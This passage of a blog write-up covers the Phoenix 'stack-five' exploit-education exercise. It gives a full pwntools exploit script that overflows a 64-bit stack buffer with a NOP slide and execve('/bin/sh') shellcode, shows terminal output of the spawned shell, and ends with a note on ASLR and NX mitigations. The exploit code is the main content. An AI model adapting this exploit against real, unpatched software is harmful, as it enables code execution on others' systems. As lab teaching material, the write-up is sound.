+</div><h3 id="part-3---shellcode">Part 3 - Shellcode</h3>
+<p>For this part we can find shellcode to execute <code>exevce(&quot;/bin/sh&quot;)</code> for an amd64 linux system online. But I am going to use <code>shellcraft</code> from the pwntools library to generate the shellcode.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I did not have to specify architecture becuase I set the context at the start of the script.</p>
+<p>The output of that line will be be the raw shellcode bytes resturned by <code>asm()</code>. The output of <code>shellcraft.linux.sh()</code> is the assembly code for executing <code>execve(&quot;/bin/sh&quot;)</code>.</p>
+<h1 id="exploiting">Exploiting</h1>
+<p>Now that we have the payload set up, the final exploit will be:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Defining binary</span>
+</span></span><span class="line"><span class="cl"><span class="n">exe</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./stack-five&#39;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># The offset and padding we need to overflow the buffer</span>
+</span></span><span class="line"><span class="cl"><span class="n">OFFSET</span>  <span class="o">=</span> <span class="mi">136</span>
+</span></span><span class="line"><span class="cl"><span class="n">PADDING</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">OFFSET</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Building payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">rip</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x7fffffffebe8</span> <span class="o">+</span> <span class="mi">40</span><span class="p">)</span> <span class="c1"># new rip -&gt; rsp</span>
+</span></span><span class="line"><span class="cl"><span class="n">nop_slide</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">100</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span> <span class="c1"># Output from shellcraft will be the assembly code below. using asm() to compile it into raw bytes</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">Shellcode in assembly:
+</span></span></span><span class="line"><span class="cl"><span class="s1">    /* execve(path=&#39;/bin///sh&#39;, argv=[&#39;sh&#39;], envp=0) */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    /* push b&#39;/bin///sh</span><span class="se">\x00</span><span class="s1">&#39; */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    push 0x68
+</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rax, 0x732f2f2f6e69622f
+</span></span></span><span class="line"><span class="cl"><span class="s1">    push rax
+</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rdi, rsp
+</span></span></span><span class="line"><span class="cl"><span class="s1">    /* push argument array [&#39;sh</span><span class="se">\x00</span><span class="s1">&#39;] */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    /* push b&#39;sh</span><span class="se">\x00</span><span class="s1">&#39; */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    push 0x1010101 ^ 0x6873
+</span></span></span><span class="line"><span class="cl"><span class="s1">    xor dword ptr [rsp], 0x1010101
+</span></span></span><span class="line"><span class="cl"><span class="s1">    xor esi, esi /* 0 */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    push rsi /* null terminate */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    push 8
+</span></span></span><span class="line"><span class="cl"><span class="s1">    pop rsi
+</span></span></span><span class="line"><span class="cl"><span class="s1">    add rsi, rsp
+</span></span></span><span class="line"><span class="cl"><span class="s1">    push rsi /* &#39;sh</span><span class="se">\x00</span><span class="s1">&#39; */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    mov rsi, rsp
+</span></span></span><span class="line"><span class="cl"><span class="s1">    xor edx, edx /* 0 */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    /* call execve() */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    push SYS_execve /* 0x3b */
+</span></span></span><span class="line"><span class="cl"><span class="s1">    pop rax
+</span></span></span><span class="line"><span class="cl"><span class="s1">    syscall
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Finally, putting them together into one payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">PADDING</span> <span class="o">+</span> <span class="n">rip</span> <span class="o">+</span> <span class="n">nop_slide</span> <span class="o">+</span> <span class="n">shellcode</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Sending the payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;education</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Going into interactive mode to interact with new shell</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We send the payload to the process we opened with <code>p.sendlineafter()</code> to send the payload right after the banner is printed.</p>
+<p>Then we go into interactive mode to input commands into the new <code>/bin/sh</code> process.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@phoenix-amd64:/opt/phoenix/amd64$ ./solve_stack-five.py
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;/opt/phoenix/amd64/stack-five&#39;</span>: pid <span class="m">1219</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
+</span></span><span class="line"><span class="cl">$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Success!</p>
+<h1 id="mitigation">Mitigation</h1>
+<p>This exploit would not have been possible if Address space layout randomization (ASLR) was enabled on this machine and the program was compiled with the <code>NX</code> bit enabled which disables any code execution from the stack. Since this is a VM made for exploit education, those mitigations were turned off but in a real world scenario they should always be enabled.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 0001-01-01</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2023-03-03-stack5/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/2023-03-03-stack5/" data-title="Simple 64-bit buffer overflow with shellcode"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/2023-03-03-stack5/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/2023-03-03-stack5/" data-title="Simple 64-bit buffer overflow with shellcode"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on VK" data-sharer="vk" data-url="http://example.org/2023-03-03-stack5/" data-title="Simple 64-bit buffer overflow with shellcode"><i class="fab fa-vk fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/2023-03-03-stack5/" data-title="Simple 64-bit buffer overflow with shellcode"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">vymvn</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"vymvn","id-2":"vymvn"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":120}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
